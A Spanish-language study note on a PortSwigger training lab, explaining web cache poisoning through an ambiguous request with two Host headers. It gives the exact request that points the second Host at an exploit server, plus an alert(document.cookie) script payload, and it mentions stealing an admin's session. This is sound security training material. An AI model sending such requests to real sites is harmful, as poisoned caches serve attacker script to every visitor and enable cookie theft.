---
aliases:
  - Host Header 003 - web cache poisoning con Host duplicado
  - web cache poisoning via ambiguous requests
tags:
  - vuln/host-header
  - example
  - portswigger
---

# 003 — Web cache poisoning con `Host` duplicado (request ambigua)

> Lab: [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests) · **Practitioner** · técnica → [[vulnerabilities/016-host-header-injection/host-header|entry point]]

## ¿Por qué acá? (bypass por parseo distinto + persistencia en caché)
- **El Host acá parece validado**, pero lo colás mandando **dos** headers `Host`: la caché **clavea** (cache key) con el primero —el real— y el back-end **refleja** el segundo —el tuyo—.
- **Por qué pega a todos:** la home refleja el `Host` en un `<script src>` absoluto de tracking. Si esa respuesta se **cachea**, tu JS malicioso queda guardado y se sirve a **cualquiera** que cargue la home (no solo a vos).

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que inyectás vos (tu exploit server en el 2º Host).

Mandá la request a `/` con `Host` duplicado, el 2º apuntando a tu server:
<pre class="payload"><code>GET / HTTP/1.1
Host: <mark>LAB-ID.web-security-academy.net</mark>
Host: <mark>TU-EXPLOIT-SERVER.exploit-server.net</mark></code></pre>
La respuesta refleja el 2º Host en `<script src="//TU-EXPLOIT-SERVER/resources/js/tracking.js">`. En el exploit server serví ese path con:
<pre class="payload"><code>alert(document.cookie)</code></pre>
Reenviá hasta que la respuesta salga **cacheada**.

## Verificación
La respuesta trae `X-Cache: hit` (quedó cacheada) y el `<script src>` apunta a tu exploit server. Cuando la víctima carga la home, **ejecuta tu JS** (`alert(document.cookie)`) → lab resuelto.

## Detalles que se pasan por alto
- El truco del **Host duplicado** es una *request ambigua*: front y back parsean distinto. Otras variantes de override → [[exam/shortcuts/host-headers|shortcut de headers]].
- El reflejo del Host queda **fuera de la cache key** → es el mismo mecanismo del topic → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|web cache poisoning]].
- Si la carga la hace un **user** → impacto Stage 1; si la hace el **admin** → Stage 2 (robás su sesión).

→ Siguiente: [[vulnerabilities/016-host-header-injection/examples/004-routing-based-ssrf-interno|004 · el front-end rutea por el Host → SSRF a una IP interna]]
